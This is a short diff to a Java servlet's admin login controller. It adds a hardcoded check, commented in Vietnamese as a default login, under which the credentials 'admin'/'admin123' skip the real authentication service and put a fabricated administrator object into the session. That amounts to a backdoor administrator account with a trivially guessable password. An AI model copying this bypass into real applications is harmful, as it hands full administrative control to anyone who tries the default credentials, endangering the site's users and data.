@@ -33,6 +33,17 @@ public class AdminLoginController extends HttpServlet {
         }
 
         try {
+            // Đăng nhập mặc định nếu là admin/admin123
+            if (emailOrUsername.equals("admin") && password.equals("admin123")) {
+                Admin admin = new Admin();
+                admin.setUsername("admin");
+                admin.setFullName("Quản trị viên mặc định");
+                admin.setEmail("admin@example.com");
+                request.getSession().setAttribute("admin", admin);
+                response.sendRedirect(request.getContextPath() + "/view/admin/dashboard.jsp");
+                return;
+            }
+
             Admin admin = adminService.authenticateAdmin(emailOrUsername, password);
             if (admin != null) {
                 request.getSession().setAttribute("admin", admin);
